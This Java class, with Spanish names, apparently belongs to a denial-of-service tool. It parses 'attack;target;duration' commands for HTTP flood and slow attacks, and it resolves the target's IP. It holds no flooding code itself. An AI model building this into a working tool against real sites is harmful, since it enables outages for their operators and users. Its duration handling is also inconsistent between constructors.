import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Date;

public class Comando {

	private String ataque;
	private URL objetivo;
	private long fin;

	public Comando() {
	}

	/**
	 * 
	 * @param ataque String http, slow
	 * @param objetivo URL formada con la dirección del objetivo
	 * @param duracion Segundos que va a durar el ataque
	 * 
	 */
	public Comando(String ataque, URL objetivo, long duracion) {
		this.ataque = ataque;
		this.objetivo = objetivo;
		this.fin = System.currentTimeMillis() + duracion;
	}

	public Comando(byte[] comando) throws MalformedURLException {
		this(stringArray(comando)[0], new URL(stringArray(comando)[1]), Integer.parseInt(stringArray(comando)[2]));

	}

	/**
	 * 
	 * @param comando String recibida con formato "ataque;objetivo;duracion en segundos"
	 * @throws NumberFormatException
	 * @throws MalformedURLException
	 */
	public Comando(String comando) throws NumberFormatException, MalformedURLException {
		this(splitComando(comando)[0], new URL(splitComando(comando)[1]),
				Integer.parseInt(splitComando(comando)[2]) * 1000);
	}

	private static String[] splitComando(String comando) {
		String[] str = comando.split(";");
		if (str[1].contains("http") == false) {
			str[1] = "http://" + str[1];
		}
		return str;

	}

	public String getAtaque() {
		return ataque;
	}

	public void setAtaque(String ataque) {
		this.ataque = ataque;
	}

	public URL getObjetivo() {
		return objetivo;
	}

	public void setObjetivo(URL objetivo) {
		this.objetivo = objetivo;
	}

	public long getDuracion() {
		return fin;
	}

	public void setDuracion(long duracion) {
		this.fin = duracion;
	}

	public static String[] stringArray(byte[] comando) {
		String[] elem = (new String(comando)).split(";");
		for (int i = 0; i < elem.length; i++) {
			elem[i] = elem[i].trim();
		}
		return elem;

	}

	
	public String ipFromURL() throws UnknownHostException{
		InetAddress addr = InetAddress.getByName(this.objetivo.getHost());
		String ip = addr.getHostAddress();
		return ip;
	}
	
	@Override
	public String toString() {
		String ataqueStr;
		if(ataque.equals("http")){
			ataqueStr = "httpFlood";
		}else{
			ataqueStr = ataque;
		}
		
		Date date = new Date(fin);
		
		
		return "[ ataque=" + ataqueStr + ", \n  objetivo=" + objetivo.toString() + ", \n  fin=" + date.toString() + " ]";
	}
	
	@Override
	public boolean equals(Object o){
		if(o instanceof Comando){
			
			boolean mismoAtaque = this.ataque.equals(((Comando)o).ataque);
			boolean mismoObjetivo = this.objetivo.toString().equals(((Comando) o).objetivo.toString());
							
			if( mismoAtaque && mismoObjetivo){
				return true;
			}else{
				return false;
			}
		
		}
		return false;
		
		
	}
	
	
	

}